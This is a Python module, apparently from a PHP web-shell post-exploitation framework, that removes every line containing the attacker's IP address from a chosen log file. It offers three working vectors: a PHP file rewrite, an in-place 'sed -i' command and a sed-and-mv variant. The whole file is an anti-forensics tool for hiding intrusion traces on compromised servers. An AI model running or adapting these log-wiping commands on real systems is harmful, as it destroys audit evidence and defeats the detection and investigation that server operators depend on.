from core.vectors import ShellCmd,PhpCode
from core.module import Module

class Clearlog(Module):

    """Simple Clear Log"""

    aliases = [ 'clearlog' ]

    def init(self):

        self.register_info(
            {
                'author': [
                    'appo'
                ],
                'license': 'GPLv3'
            }
        )


        self.register_vectors(
            [
            PhpCode("""$fc=file("${file}");
                       $f=fopen("${file}","w");
                       foreach($fc as $line)
                       {
                         if (!strstr($line,"${ip}"))
                         fputs($f,$line);
                       }
                       fclose($f);""",
              name = "php-mode"
            ),
            ShellCmd("""sed -i /${ip}/d ${file}""",
              name = "simple"
            ),
            ShellCmd("""sed /${ip}/d ${file} > ${file}.$$ && /bin/mv ${file}.$$ ${file}""",
              name = "old-school"
            )
            ]
        )

        self.register_arguments([
          { 'name' : 'ip', 'help' : 'Your IP' },
          { 'name' : 'file', 'help' : 'File to Clear' },
          { 'name' : '-vector', 'choices' : self.vectors.get_names(), 'default' : "simple" },
        ])

    def run(self):

        return self.vectors.get_result(
         name = self.args['vector'],
         format_args = self.args
        )
